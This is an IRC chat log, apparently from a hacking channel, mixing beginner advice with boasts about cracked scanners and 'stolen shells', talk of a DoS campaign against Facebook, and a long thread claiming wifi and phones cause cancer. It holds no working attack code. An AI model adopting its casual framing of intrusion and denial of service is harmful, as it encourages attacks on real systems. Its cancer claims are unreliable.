[11:57.42] <RaT> well, yesterday
[11:57.47] <RaT> to sqlmap?
[11:57.49] <Ivain-Tintin> yea
[11:57.51] <Ivain-Tintin> ?
[11:57.57] <RaT> http://sqlmap.sourceforge.net/
[11:58.06] <Ivain-Tintin> thx so mooutch bro
[11:58.15] <Rode0s_> iPhone keeps track of u
[11:58.19] <RaT> it's all good
[11:58.21] <Rode0s_> But it can be blocked
[11:58.38] <hypotenuse> Rode0s_, if you found out your cat was a cyborg from the FBI, would you feed it?
[11:58.38] <RaT> Ivain-Tintin if you want something really easy that will leave a lot of logs, use Acunetix :-D
[11:58.53] <RaT> We cracked that, could probably release to you guys privately :-D
[11:59.12] <hypotenuse> RaT, just be cautious what you give to whom
[11:59.16] <hypotenuse> trust is a big part of these channels.
[11:59.36] <RaT> i didn't mean give to the room
[11:59.41] <hypotenuse> Nah, I know
[11:59.43] <RaT> only person i really know is fox at the moment
[11:59.49] <RaT> so would probably give to him and let him dissiminate
[11:59.57] <hypotenuse> DEFCON wasn't so fun for me :/
[12:00.03] <RaT> why not?
[12:00.07] <hypotenuse> I went with a few colleagues, but it wasn't that entertaining.
[12:00.08] <RaT> didn't get any rum? :-(
[12:00.15] <RaT> did you meet up with fox?
[12:00.17] <hypotenuse> Eh, bought drinks here and there
[12:00.28] <hypotenuse> Nope, didn't meet anyone from the channel due to recent events
[12:00.33] <RaT> probably smart
[12:00.51] <hypotenuse> Yeah I'm still digging into what sparked that batshit hull of feds.
[12:00.53] <fxm> looks like the @blackhatacademy twitter is gone
[12:01.02] <hypotenuse> They had 15 people at my front door, ready to confiscate some booty
[12:01.11] <RaT> that's scary
[12:01.32] <RaT> i had 2 agents visit me in 2001 due to World of Hell hacking group, I fled the state :-P
[12:01.32] <Rode0s_> XD
[12:01.32] <hypotenuse> Tell me about it. I was still in my nightie.
[12:01.41] <RaT> that was just 2 agents that wanted to talk
[12:01.44] <RaT> i couldn't imagine 15
[12:01.45] <RaT> fuck that
[12:01.53] <hypotenuse> They always say they want to talk, but the cake is a lie.
[12:02.05] <RaT> ha ha ya
[12:02.07] <hypotenuse> Feds are like satan. They want to steal your soul.
[12:02.25] <hypotenuse> Literally threaten you beyond prosecution, and then try and turn you as their weapon.
[12:02.29] <RaT> that's why i joined the military 10 years ago
[12:02.38] <RaT> figured i was about to go down, so i joined up and avoided a second arrest
[12:02.52] <hypotenuse> Nice, just keep under the raps there and you'll be fine
[12:02.59] <hypotenuse> cops vs army is a losing battle for the pigs
[12:03.09] <hypotenuse> no jurisdiction and no balls either
[12:03.17] <RaT> yep yep
[12:03.22] <Ivain-Tintin> Thx rat
[12:03.29] <fxm> unless you mess up and get UCMJ'd
[12:03.33] <RaT> har har ya
[12:03.36] <hypotenuse> I got my Ts/Sc clearance last month though, so some of my data can soon be considered classified
[12:03.40] <RaT> i got a 5k bonus and put on red team :-D
[12:03.42] <celex> can some1 help
[12:03.43] <hypotenuse> UCMJ?
[12:03.44] <celex> ?
[12:03.54] <RaT> uniform code of military justice
[12:03.56] <fxm> uniform code of military justice
[12:04.03] <RaT> he's meaning getting busted by the military police
[12:04.05] <RaT> :-P
[12:04.13] <celex> i asked if somebody can help ?
[12:04.22] <RaT> help with what?
[12:04.37] <celex> learning to hack im totaly starter...
[12:05.00] <FoxInSocks883> I am too
[12:05.01] <celex> im totaly starter in hydraIRC
[12:05.16] <celex> help pls... wanna learn
[12:05.26] <hypotenuse> AH
[12:05.29] <RaT> what aspect?
[12:05.56] <hypotenuse> celex, hacking is not a skill
[12:06.05] <hypotenuse> it's a complex process of knowledge and use of your skills
[12:06.08] <guy_> anyone knows a nice arm asm tut?
[12:06.22] <hypotenuse> simply using autopwn does not make you a hackjer
[12:06.23] <RaT> celex, if you make an account you can read books for free at soldierx.com
[12:06.25] <hypotenuse> hacker*
[12:06.27] <RaT> or you could just torrent them
[12:06.27] <celex> ok ty for that
[12:06.32] <RaT> but here is one that might help you http://www.soldierx.com/books/Network%20Security%20Tools
[12:06.40] <hypotenuse> celex, start reading some comp sci
[12:06.45] <hypotenuse> know your hardware, then go into programming
[12:06.49] <JackofCoins> I find all my books at library.nu usually
[12:07.00] <JackofCoins> Programming books at least
[12:07.02] <RaT> I'm only plugging SX because i'm in the crwe there :-P
[12:07.11] <hypotenuse> Heh, I figured as much
[12:07.14] <celex> question
[12:07.21] <hypotenuse> answer
[12:07.25] <hypotenuse> *applause*
[12:07.59] <celex> if i want to hack some suite i need knoweledge for http
[12:08.11] <RaT> celex: yes, or at least a tool that hacks http
[12:08.22] <RaT> celex: best method is to know what you're doing though, and not just blindly use a tool
[12:08.24] <hypotenuse> RaT, HAHA
[12:08.34] <RaT> guy_: http://infocenter.arm.com/help/index.jsp maybe?
[12:08.42] <hypotenuse> I'm gonna go chop me down some eich tee tee pee
[12:08.50] <RaT> :-P
[12:08.52] <FoxInSocks883> thanks  Rat
[12:08.54] <FoxInSocks883> thanks bro
[12:09.07] <RaT> actually i think i'm getting tired
[12:09.14] <hypotenuse> I once stole a POS device
[12:09.21] <RaT> hacking a site would be way more than http celex
[12:09.23] <celex> ok so for starters in hacking where should i go and what should i do
[12:09.27] <RaT> it's any of the technologies that the site uses that you could exploit
[12:09.43] <RaT> celex: check out that book i linked you to
[12:09.43] <FoxInSocks883> Rat        Can i start with php ?
[12:09.44] <celex> oh ok..
[12:09.47] <RaT> celex: it covers a lot fo the tools
[12:09.56] <celex> infocenter?
[12:10.00] <RaT> FoxInSocks883: you could start with whatever you want. php is popular :-P
[12:10.08] <hypotenuse> 99% of these guys give up
[12:10.16] <RaT>  http://www.soldierx.com/books/Network%20Security%20Tools
[12:10.23] <celex> y its hard at begigning
[12:10.23] <RaT> ya, that's why i refer them to books
[12:10.23] <hypotenuse> they say they don't understand shit, but they're using their computers just the way they used them before
[12:10.30] <guy_> RaT, have you read it or did you just googled ? I'm looking for some feedback from others :)
[12:10.32] <hypotenuse> Good stuff. Nothing like some heavy reading
[12:10.41] <RaT> guy_ i just googled, i'm not very familiar with arm
[12:10.43] <hypotenuse> guy_, I'm pretty sure he's read a lot.
[12:10.49] <RaT> i know some good references for x86 and sparc
[12:10.51] <RaT> i have one mips books
[12:10.52] <RaT> but nothing on arm
[12:11.08] <RaT> figure their reference page can't be bad though :-p
[12:11.13] <hypotenuse> Take this paper for example
[12:11.14] <hypotenuse> http://www.trapkit.de/research/sslkeyfinder/keyfinder_v1.0_20060205.pdf
[12:11.17] <Anubis> http://smallbasic.com/ :D
[12:11.18] <hypotenuse> All your keys are belong to us
[12:11.49] <guy_> RaT, looking for something shorter to study on the weekend
[12:12.24] <Anubis> guy, look at smallbasic ;D
[12:12.27] <RaT> grsec secure sanitize memory would help against taht
[12:12.32] <selket> who wants to jump in on a skype call
[12:12.33] <selket> ?
[12:12.33] <RaT> but in that particular paper, i don't think you can do much
[12:12.41] <RaT> sicne apache will be using the private key :-/
[12:12.53] <selket> WHO WANTS TO SKYPE
[12:12.59] <RaT> the memory sanitization that grsec can do (or maybe it's PaX) is only after memory is freed
[12:13.00] <Anubis> selket: to do what?
[12:13.07] <anon9819823> YES!  My kernel finally supports the keyboard after 3 days of work...  LOL
[12:13.08] <selket> you fucking srs
[12:13.10] <selket> lul
[12:13.14] <hypotenuse> selket just wants to steal your p2p keys
[12:13.19] <selket> lul
[12:13.29] <hypotenuse> I'll hop in, hold on
[12:13.31] <selket> we're confing on skype
[12:13.36] <RaT> guy_ let me ask somebody
[12:13.43] <selket> cool :D
[12:13.46] <hypotenuse> time to create false skype account!
[12:13.53] <selket> haha see
[12:13.59] <selket> ^ this is how we does it
[12:14.05] <RaT> selket: i can't skype.  I can only irc from stolen shells :-P
[12:14.16] <hypotenuse> What is my name again?
[12:14.17] <selket> then youre a fag
[12:14.24] <hypotenuse> Ph Peggy
[12:14.26] <selket> how should i know
[12:14.42] <RaT> selket: but i don't own a harley :-P
[12:14.51] <selket> ooo
[12:14.54] <selket> well played :D
[12:15.11] <fxm> 1 fucking cig left O_O
[12:16.25] <FoxInSocks024> FUUUUUUUUUUUUUUUCK THIS SHIT
[12:16.34] <Rode0s_> I still have to setup wirless
[12:16.42] <Rode0s_> On my gentoo -.-"
[12:16.49] <selket> fxm gay bro
[12:16.54] <selket> i feel your pain
[12:17.12] <FoxInSocks883> goodbye  I going to learn php
[12:17.19] <FoxInSocks883> this IRc is  the  best
[12:17.29] <RaT> guy_ what are you using to compile?
[12:17.49] <selket> hypotenuse: add selketraz
[12:17.51] <RaT> guy_: if using realview, i see a good paper at stanford
[12:18.11] <anon9819823> Php is easy peasy.
[12:18.41] <hypotenuse> no mic though D:
[12:18.48] <RaT> guy_ here is a small one http://www.eng.auburn.edu/~nelson/courses/elec5260_6260/ARM_AssyLang.pdf
[12:19.06] <hypotenuse> and my vpn is a little shoddy today
[12:19.24] <JackofCoins> what are a couple good vpn's?
[12:19.35] <RaT> hypotenuse: i need to set mine up.  I have a fancy juniper router and I'm still using ghetto fabulous ssh tunnels :-P
[12:19.39] <JackofCoins> and I'm willing to pay
[12:19.53] <RaT> JackofCoins: one of my friends owns a vpn service
[12:19.53] <Anubis> http://pastehtml.com/view/avgjfinss.html
[12:20.02] <RaT> JackofCoins: I can ask him how fed friendly he is :-D
[12:20.46] <fxm> openvpn from a shinjiru box
[12:20.49] <ahmad5862> hello
[12:20.53] <ahmad5862> hi
[12:20.58] <RaT> JackofCoins: http://tunnelr.com/
[12:21.02] <Rode0s_> Whats a shinjiru box?
[12:21.15] <fxm> offshore
[12:21.17] <ahmad5862> can any body tel me what this channel is al abt?
[12:22.16] <JackofCoins> I dont do anything fed-unfriendly other than to my network i just prefer security
[12:22.22] <m4tr1c3s> hai selkie
[12:22.25] <RaT> back when we had a ton of hacked modems, we were going to offer completely anonymous vpn services - decided to back out due to fear of fed intervention
[12:22.34] <hypotenuse> RaT, I'm running off BGAN for office connections
[12:22.36] <hypotenuse> fiber for home
[12:22.49] <hypotenuse> and copper for entertainment
[12:23.08] <RaT> JackofCoins: look at http://disconnect.me - it's a plugin to stop sites from tracking you
[12:23.21] <phed> what it do
[12:23.25] <RaT> JackofCoins: most vpn solutions will mask your IP but not your identity.  Alot can be identified by your browser, plugins, etc
[12:23.38] <RaT> phed: it changes a lot of the outgoing traffic from your browser
[12:23.47] <Rode0s_> #tip use another box!
[12:24.08] <RaT> Rode0s_: agreed.  the more precautions the better though
[12:24.08] <phed> lmao what it do means

[12:26.25] <FoxInSocks230> hello guys!!
[12:27.54] <FoxInSocks230> Guys!!! Tell me please! Where should i start to learn and practice in computer security and hacking! Hacking first!)) With no knowledge about hacking - no security! ))
[12:27.57] <Rode0s_> Whatsapp WITH fozinsocks people?
[12:28.56] <RaT> Rode0s_: i'm guessing a web client somewhere?
[12:29.08] <xseedr> foxinsocks230 you should start by learning some sort of programming language
[12:29.28] <xseedr> if you really want to get crazy, that is
[12:29.43] <xseedr> visual basic is the easiest to grasp
[12:29.43] <RichyB_> who can i speak to about #academy ?
[12:30.02] <m4tr1c3s> rodeos
[12:30.02] <JackofCoins> its a subcult
[12:30.02] <JackofCoins> i mean a cult lol
[12:30.02] <FoxInSocks230> is anybody here???
[12:30.06] <hypotenuse> Nope
[12:30.09] <m4tr1c3s> sabu tweeted a client
[12:30.19] <Enti0c> Hey everyone
[12:30.33] <FoxInSocks230> Guys!!! Tell me please! Where should i start to learn and practice in computer security and hacking! Hacking first!)) With no knowledge about hacking - no security! ))
[12:30.45] <taru> hey, Enti0c
[12:30.50] <Rode0s_> m4tr1c3s: ?
[12:31.15] <Enti0c> FoxInSocks230, learn the basics of TCP/IP and install linux
[12:31.20] <StarGoofer> go to www.hackthissite.org there you can learn some basics atleast
[12:31.30] <m4tr1c3s> rodeos
[12:31.31] <m4tr1c3s> for the talk
[12:31.35] <m4tr1c3s> sabu tweeted a client
[12:31.36] <Rode0s_> Ah xD
[12:31.41] <FoxInSocks230> i know perl, c++ =) tcp/ip, linux =)) i'am system administrator)))
[12:31.42] <m4tr1c3s> lol
[12:31.44] <Enti0c> How did the 12 hour school lessons go?
[12:31.46] <Rode0s_> Ok thx
[12:31.56] <m4tr1c3s> awesome
[12:31.59] <hypotenuse> FoxInSocks230, then wtf are you asking for hacker manuals then?
[12:32.04] <Enti0c> ^
[12:32.06] <m4tr1c3s> they were cool
[12:32.27] <JackofCoins> lol
[12:32.28] <Enti0c> Yea, I has the logs, just got home from work, i had to put up with 17 hours of bullshit

[12:50.26] <JackofCoins> gnite peoples thanks everyone who talked a lot of interesting things learned
[12:52.42] <tytaN> i wouldn't want to stand next to a giant wifi antenna
[12:52.54] <tytaN> i feel cancerish already while standing next to my ralink 3070 usb card
[12:53.00] <tytaN> 2mW
[12:53.04] <fdsfdskjgfnlsd> lol
[12:53.05] <tytaN> way too much already :S
[12:53.17] <fdsfdskjgfnlsd> esoteric fool
[12:53.31] <selket> lul
[12:53.37] <tytaN> yeah whatever
[12:54.27] <tytaN> (that hasn't got shit to do with esoteric btw but right..)
[12:54.47] <selket> esoteric..
[12:55.06] <tytaN> whatever the noun
[12:55.13] <tytaN> :E
[12:55.24] <selket> oh i just know of someone who uses that nick
[12:55.40] <selket> Enti0c: ill be back on the call soon
[12:55.42] <Enti0c> k add'd
[12:55.42] <tytaN> ah ;)
[12:55.44] <selket> just have a mate over
[12:55.48] <hypotenuse> THIS CALL IS AWESOME
[12:58.13] <tytaN> fdsfdskjgfnlsd: how do you explain the cancer rate of full body scanner-attendants at the airport if what I said makes me a fool -.-
[12:58.36] <fdsfdskjgfnlsd> lol
[12:58.48] <tytaN> and they aren't even the guys who get scanned
[12:58.54] <tytaN> if you know what i mean
[12:59.25] <tytaN> "hm lol" aight than this is settled
[12:59.26] <tytaN> :E
[12:59.29] <fdsfdskjgfnlsd> yey i know what you mean but its complete bs
[13:00.04] <tytaN> so explain it to me
[13:00.06] <selket> who are you guys calling?
[13:00.23] <tytaN> and explain why my hand gets numb every fuckin time I get too close to my wifi card while it's turned
[13:00.25] <tytaN> for a longer period of time
[13:00.27] <hypotenuse> Just realised if I position a dish properly, and have my backpack cellsite linked
[13:00.30] <tytaN> turned on
[13:00.32] <hypotenuse> I can impersonate networks :D
[13:00.42] <selket> tytaN: i can explain that.. youre crazy
[13:00.59] <fdsfdskjgfnlsd> :D
[13:01.03] <tytaN> one might suspect such a thing
[13:01.04] <tytaN> :>
[13:01.12] <tytaN> it's not that i'm convinced of it or any correlation
[13:01.12] <tytaN> but it happens
[13:01.16] <selket> lulul
[13:02.10] <tytaN> my father is a radio technician and he said it's possible but not proven
[13:02.17] <tuiz> tyaN: the power of one's imagination
[13:02.18] <tytaN> but there are many odds that convince me that it's not nonsense
[13:02.20] <tytaN> at least the cancer thing
[13:02.21] <tytaN> yes
[13:02.25] <tytaN> i'm searchin for the word
[13:02.30] <tytaN> psychosomatic
[13:02.31] <tytaN> i know
[13:02.40] <fdsfdskjgfnlsd> cancer thing hhas nothing to do with this
[13:02.50] <fdsfdskjgfnlsd> this is because of radiation
[13:03.04] <tytaN> well u know this huge ass antennas put up by mobilephone companies
[13:03.07] <tytaN> we have one in my country
[13:03.12] <tytaN> standing 1km from a 3000 inhabitant village
[13:03.16] <tytaN> over the last 5 years
[13:03.23] <tytaN> cancer rate skyrocketed over 1000%
[13:03.29] <tytaN> care to explain?
[13:03.35] <tytaN> like i said i'm not convinced but i'm cautious
[13:03.35] <fdsfdskjgfnlsd> hm...
[13:03.40] <fdsfdskjgfnlsd> could be another factor
[13:03.43] <tytaN> so: i wouldn't stand next to a huge ass wifi antenna
[13:04.07] <fdsfdskjgfnlsd> like a nucleaaar powa plant
[13:04.16] <tytaN> and i only turn my wifi usb card on when it's absolutely necessary
[13:04.30] <tytaN> there's no dangerous radiation leaking out of intact nuclear powerplants...
[13:04.33] <tytaN> at least it shouldn't
[13:04.37] <fdsfdskjgfnlsd> false
[13:04.39] <tytaN> there's more radiation leaking out of your laptop
[13:04.44] <fdsfdskjgfnlsd> false
[13:04.45] <tytaN> well close to none
[13:04.54] <tuiz> ???
[13:04.59] <tytaN> google xkcd's radiation tablet
[13:05.02] <fdsfdskjgfnlsd> i live in germany
[13:05.04] <tytaN> very nice explanation
[13:05.08] <fdsfdskjgfnlsd> and there was a study
[13:05.16] <tytaN> good for you to tell me
[13:05.18] <fdsfdskjgfnlsd> that the cancer rates
[13:05.18] <tytaN> i probably read it
[13:05.25] <tytaN> though i won't tell you where i live
[13:05.27] <tuiz> i don't tust a study which i have not faked myself
[13:05.36] <fdsfdskjgfnlsd> around the nuclear powerplants are much higher
[13:05.44] <fdsfdskjgfnlsd> blabla
[13:05.46] <fdsfdskjgfnlsd> this is proven
[13:05.55] <tytaN> (but the village i'm talking about is in germany)
[13:06.03] <fdsfdskjgfnlsd> yey
[13:06.09] <tuiz> yeah sure...but if you lie in the sun everyday you will surlely get skin cancer
[13:06.20] <fdsfdskjgfnlsd> near asse or gorleben?
[13:06.24] <tuiz> ^^
[13:07.03] <tytaN> whatever micrwoaves penetrating your body
[13:07.05] <tytaN> with lots of power
[13:07.08] <tuiz> but to apeace your mind: radioation is everywhere
[13:07.09] <tytaN> can't be fuckin healthy
[13:07.16] <tytaN> with low frequencies maybe
[13:07.47] <fdsfdskjgfnlsd> maybe but wlan and mobile phones dont have enough power
[13:08.08] <tuiz> they have enough power
[13:08.12] <fdsfdskjgfnlsd> never
[13:08.17] <tytaN> don't want to debate about that
[13:08.18] <tytaN> how do you know
[13:08.20] <fdsfdskjgfnlsd> max 100mW
[13:08.37] <tuiz> if you carry your mobile phone in your pocket you'll get testicle cancer
[13:08.47] <fdsfdskjgfnlsd> bs
[13:08.58] <tytaN> i got a friend who had cancer when he was 14
[13:09.04] <tytaN> it started at his legg
[13:09.04] <tuiz> there was a study recently by italian scientists
[13:09.10] <tytaN> where he had his cellphone
[13:09.19] <tytaN> his uncle does strahlungstherapie (verstehste ja)
[13:09.22] <tytaN> dunno the english word
[13:09.23] <tuiz> yep...thats the one
[13:09.32] <tytaN> he healed him from the cancer
[13:09.44] <tuiz> lawl...lots of germans here...
[13:09.54] <tytaN> meaning this shit can be good or bad
[13:09.59] <fdsfdskjgfnlsd> i dont think this comes from the mobile phone
[13:10.03] <fdsfdskjgfnlsd> cuz
[13:10.23] <tytaN> <:
[13:10.23] <fdsfdskjgfnlsd> it dont emitate so much "radiation" when in pocket
[13:10.32] <tytaN> but you don't know for sure so i'm cautious
[13:10.37] <tytaN> i read too much about this shit
[13:10.42] <tuiz> http://www.netzwelt.de/news/86988-who-handy-nutzung-krebs-fuehren.html
[13:10.55] <tuiz> its also in your language
[13:11.07] <fdsfdskjgfnlsd> because you dont talk with someone on the phone with your phone in the pocket
[13:11.35] <tuiz> yeah but its all about the passive radiation
[13:11.51] <tuiz> if you carry it in your pocket there is still enough radiation
[13:12.28] <fdsfdskjgfnlsd> there is much more radiation in the air than your little mobile phone can emitate
[13:12.42] <flip> ^^
[13:12.59] <fdsfdskjgfnlsd> another point is,
[13:13.06] <fdsfdskjgfnlsd> that if the influence is so big
[13:13.09] <tytaN> ofc
[13:13.15] <fdsfdskjgfnlsd> many ppl should have died because
[13:13.24] <tytaN> but the source is farer away so the power with which it reaches you shouldn't be as concentrated as if the source of emitation is close to your body
[13:13.29] <fdsfdskjgfnlsd> the number of mobile phones increased so heavyly
[13:13.47] <tytaN> like you said: psychosomatic
[13:13.48] <tuiz> well since there is no official statistic about it they just fall into the cancer statistics
[13:13.51] <tytaN> i will never die of cancer because i know that i will never die of cancer
[13:14.10] <tytaN> it's at least 50% depending from ones psyche
[13:14.12] <tytaN> if not 100%
[13:14.17] <tytaN> but that's my opinion
[13:14.36] <fdsfdskjgfnlsd> the opposite is happening the ppl are going to live longer and this is a huge problem
[13:14.45] <fdsfdskjgfnlsd> because its so expensive
[13:15.11] <tuiz> modern medicin
[13:15.18] <tytaN> :S
[13:15.23] <tytaN> well none of us really knows
[13:15.29] <tytaN> but it can't hurt to be cautious and put this shit into question
[13:15.33] <tuiz> even if people are due they are kept aliv bey medicin
[13:15.44] <tytaN> i mean we all know the potential destructive power from microwaves
[13:15.52] <darkness> lol. radiation in the bollocks.
[13:16.08] <tytaN> i don't like the thought of this shit running through my body at high concentrations
[13:16.11] <fdsfdskjgfnlsd> this is pointless because we cant do anythign against the radiation...
[13:16.26] <fdsfdskjgfnlsd> so we just feared it could be a danger
[13:16.33] <tuiz> you can reduce the amount you expose yourself to
[13:16.43] <fdsfdskjgfnlsd> the best way to deal with this is just to ignore it
[13:17.03] <fdsfdskjgfnlsd> yeah you can reduce it,
[13:17.04] <fdsfdskjgfnlsd> but
[13:17.06] <tuiz> good luck ignoring the cancer in your balls ;)
[13:17.11] <fdsfdskjgfnlsd> its just about peanuts
[13:17.22] <fdsfdskjgfnlsd> if you broke your leg
[13:17.34] <fdsfdskjgfnlsd> and they net to scan it
[13:17.51] <fdsfdskjgfnlsd> you get mass radiation and you can do nothing about it
[13:17.54] <tytaN> probably
[13:17.56] <tytaN> like everything
[13:18.10] <tytaN> you are even exposed to radiation while having sex or eating an apple, it's everywhere and a part of nature
[13:18.19] <fdsfdskjgfnlsd> yes
[13:18.34] <fdsfdskjgfnlsd> so just dont be a bitch about a bit of wlan
[13:18.57] <tytaN> well like i said i don't trust it
[13:19.01] <tuiz> well it is a part of nature i give you that, but just a certain mount
[13:19.10] <tuiz> *amount
[13:19.11] <tytaN> my father would laugh about it as well (like i said radio technician)
[13:19.36] <tytaN> but even if i only imagine the stuff like my hand turning numb
[13:19.37] <tytaN> it still happens.
[13:19.56] <tytaN> yes ofc tuiz
[13:20.05] <tytaN> that's what i tried to say a certain amount of radiation is completely normal
[13:20.09] <tytaN> not dangerous
[13:20.14] <tytaN> and inevitable
[13:20.27] <tuiz> hey if I have my mobile in my pocket long enough my leg begins to hurt exactlyy in this place
[13:20.51] <tuiz> but tehre is also radiation which is evitable
[13:20.57] <tuiz> *there
[13:21.10] <tytaN> sometimes i have this as well
[13:21.15] <tytaN> :\
[13:21.26] <tuiz> yeah...so that shit is true
[13:21.38] <tuiz> and i even know the biologics behind it
[13:21.52] <tuiz> that makes it even more scary and plausible
[13:22.30] <tytaN> :/
[13:23.19] <Lukas> ok, a question: What can you learn at this "school"?
[13:23.29] <tytaN> i'm still using wlan u know, i just want to say: i don't want to stand next to 100MW antenna
[13:23.51] <fdsfdskjgfnlsd> modern medicine will help us to survive the raddiation :P
[13:24.29] <tytaN> Lukas: topic
[13:24.39] <tytaN> let's hope so
[13:25.07] <darkness> tbh, the people who use the school are probably either lazy or have low iq.
[13:25.49] <darkness> casing point. First most people don't know there way around a linux box. don't understand networking or coding.
[13:26.05] <tuiz> thats exactly the point tyaN
[13:26.07] <darkness> If you can't learn that stuff on your own then
[13:26.16] <fdsfdskjgfnlsd> in my opinion its a waste of time to fear about such things
[13:27.45] <fdsfdskjgfnlsd> darkness i disagree
[13:28.20] <fdsfdskjgfnlsd> some ppl are here just 4 fun
[13:28.47] <darkness> :-)
[13:28.57] <fdsfdskjgfnlsd> and some talks are rly informative and you get some infos you can not just google
[13:29.34] <fdsfdskjgfnlsd> okay most of it you can google :D
[13:30.20] <m4tr1c3s> darkness, you're wrong.
[13:30.28] <m4tr1c3s> to put it simply.
[13:30.28] <turbopinko> \
[13:30.31] <m4tr1c3s> then again, most of the 100 - 300 people we've had aren't #school
[13:30.35] <m4tr1c3s> they're people who joined because of the 12 hour lesson
[13:30.38] <m4tr1c3s> the actual students of #school are a very small group
[13:30.41] <m4tr1c3s> comparatively, anyway
[13:31.33] <fdsfdskjgfnlsd> in the tuts.tar is a file named on elite life by fox...is this real?
[13:32.04] <MacGyver_AFK> morning peeps
[13:32.10] <Incognito> is there a way to install a keylogger on a router ?
[13:32.13] <tytaN> yeah
[13:32.15] <tytaN> most definitely
[13:32.22] <tytaN> hey
[13:32.22] <tytaN> :>
[13:32.34] <tytaN> MacGyver_AFK: u have the loggs for yesterdays 12h lesson?
[13:32.50] <m4tr1c3s> sure if you know what you're looking. for
[13:33.06] <MacGyverr> more then likely
[13:33.13] <m4tr1c3s> but most of school is just teachers saying google this and figure out how to do it properly
[13:33.27] <m4tr1c3s> enti0c
[13:33.30] <m4tr1c3s> hey tytan
[13:34.08] <tytaN> hey :>
[13:36.21] <Enti0c> sup
[13:36.26] <tytaN> darkness: for example. wikipedia doesn't tell you if truecrypt or dm-crypt are to be recommended
[13:36.37] <tytaN> google gives a million different answers
[13:36.48] <selket> Enti0c is funny as fuck on calls
[13:37.01] <Enti0c> :)
[13:37.10] <darkness> tytaN: Yes but you can read papers on truecrypt.
[13:37.25] <tytaN> you're still calling windows hotline?
[13:37.31] <tytaN> yeah i just wanted to say
[13:37.34] <Enti0c> called some hotels
[13:37.39] <Enti0c> they wouldnt let me bring my pet goat in
[13:37.43] <tytaN> if you tell me you're a specialist on linear cryptography
[13:37.44] <tytaN> and stuff
[13:37.57] <tytaN> i know i can trust in your opinion more or less
[13:38.26] <FoxInSocks174> restart
[13:39.18] <anon9819823> Lol
[13:39.29] <anon9819823> That seems a bit rough.
[13:39.44] <FoxInSocks174> facebook thing scam?
[13:40.18] <anon9819823> We are going to destroy facebook, not hack it.
[13:40.28] <anon9819823> There's a good plan in the works.
[13:41.35] <FoxInSocks174> what sort of attacks are in the motion?
[13:42.14] <mrbroadcloak> attacks that involve feces
[13:42.56] <FoxInSocks174> lol
[13:43.13] <tytaN> i asked the same thing yesterday: is it assessable whether facebook would withstand layer 7 dos attacks?
[13:43.43] <T00F00> hi all
[13:43.58] <FoxInSocks174> denial of service seems lame idea
[13:45.04] <T00F00> how about #refref tool ?
[13:45.15] <T00F00> is it ready for use ?
[13:45.24] <fdsfdskjgfnlsd> lol go to opfacebook this is school
[13:46.16] <FoxInSocks174> lunch time:P
[13:46.37] <FoxInSocks174> some anons claim its true some against
[13:46.55] <Jim> DDos wont work
[13:46.55] <FoxInSocks174> dont know whats the real deal
[13:47.12] <FoxInSocks935> Hello
[13:47.18] <FoxInSocks174> @jim exactly
[13:47.31] <FoxInSocks935> Anyone here?
[13:47.45] <FoxInSocks174> no !
[13:47.57] <FoxInSocks935> Good.
[13:48.47] <FoxInSocks935> So, you and me are the only two here, aren't we?
[13:48.56] <fdsfdskjgfnlsd> .
[13:48.59] <FoxInSocks935> Anyone?
[13:49.03] <FoxInSocks844> I am
[13:49.05] <RichyB_> hello
[13:49.08] <MacGyverr> not at all
[13:49.14] <FoxInSocks935> Oh god... I'm alone... So alone....
[13:49.20] <FoxInSocks202> lol
[13:50.03] <Me> whats this thing about the facebook op?
[13:50.07] <Tr0n_> Hello...
[13:50.15] <Me> where's the sign up button?
[13:50.45] <FoxInSocks844> I dont think this class has a roster
[13:50.47] <tytaN> Jim: i'm talking about layer 7 dos
[13:51.01] <tytaN> even cisco systems say they are potentially vulnerable
[13:51.05] <tytaN> i just want to know hypthetically
[13:51.08] <takeo> were gonna have lessons today?
[13:51.19] <tytaN> but there's probably no way to tell until somebody trys
[13:51.33] <Me> tytaN fuzz it, depends what u r testin
[13:52.31] <Me> metasploit FW has some fuzzers
[13:52.39] <Me> never tested but should be pretty straigh forward
[13:52.52] <tytaN> i'm not testing anything, a friend said that facebook are probably dos-proof
[13:53.05] <Me> lol
[13:53.05] <fdsfdskjgfnlsd> pls xplain how layer 7 dos works
[13:53.13] <Me> layer 7 was application right?
[13:53.19] <tytaN> I replied that since even cisco systems are potentially vulnerable, facebook is probably as well
[13:53.30] <Me> facebook is not dos-proof
[13:53.39] <tytaN> strictly talking hypothetical
[13:53.43] <Me> ofc
[13:53.53] <tytaN> (about layer 7 only as i said)
[13:54.04] <tytaN> it's something like sending incomplete packages that won't get send back
[13:54.08] <tytaN> and therefore block a connection
[13:54.09] <FoxInSocks844> I dont think anything is impossible.... nobody is ANYTHING-proof
[13:54.19] <tytaN> kk
[13:54.31] <Me> facebook is used to a lot of traffic, that's the only advantage they have
[13:54.40] <Me> because they get a lot of regurests per day
[13:54.44] <tytaN> well i'm pretty sure facebook is layer 4 proof <:
[13:54.46] <Me> but doesnt mean impossible
[13:54.55] <tytaN> but who knows
[13:55.00] <tytaN> there's always some way
[13:55.08] <taurian> can you guys name a couple high quality encrypted VPN's that do not log
[13:55.09] <Me> i'm thinking inside jo
[13:55.11] <Me> job*
[13:55.24] <Jim> facebook is no way impossible to hack
[13:55.37] <tytaN> yeah
[13:55.47] <Jim> just very hard :)
[13:55.51] <Me> there were some XSS xplts months back on some newsletter
[13:55.52] <blergh> LAYER SEVEN
[13:55.53] <tytaN> i'm pretty sure facebook has a lot of anon employees
[13:55.55] <blergh> PROTIP
[13:55.56] <tytaN> at least one
[13:56.04] <blergh> EVERYBODY LIKES PEPPERONI PIZZA
[13:56.06] <fdsfdskjgfnlsd> i would just spamm them with mass account generation
[13:56.13] <Me> maybe thats why its it's partially anon
[13:56.27] <tytaN> lol
[13:56.27] <tytaN> :D
[13:56.28] <fdsfdskjgfnlsd> :D
[13:57.16] <Me> i use the best ant-fb plan
[13:57.24] <Me> all my info even chats with my "gf" are fake
[13:57.30] <FoxInSocks710> hey, what's up!
[13:57.35] <Me> they must think i'm some uber investor
[13:57.35] <Me> :D
[13:58.00] <Me> anyways problem is not the system - fb
[13:58.03] <Me> it's people
[13:58.08] <Me> dump enough to actually put their info
[13:58.28] <blergh> or, even easier if you want it all Me
[13:58.37] <blergh> All people seem to need dat pepperoni pizza
[13:58.37] <blergh> :D

[13:58.49] <Me> rofl
[13:58.50] <Me> :D
[13:58.58] <FoxInSocks844> people who are willing to sell other people out wont just stop, they will have to be SHOWN the error of their ways
[13:59.24] <Me> well mark from fb is more of a business guy then a tech guy
[13:59.29] <Me> good skills, but different mind
[13:59.49] <Me> rofl
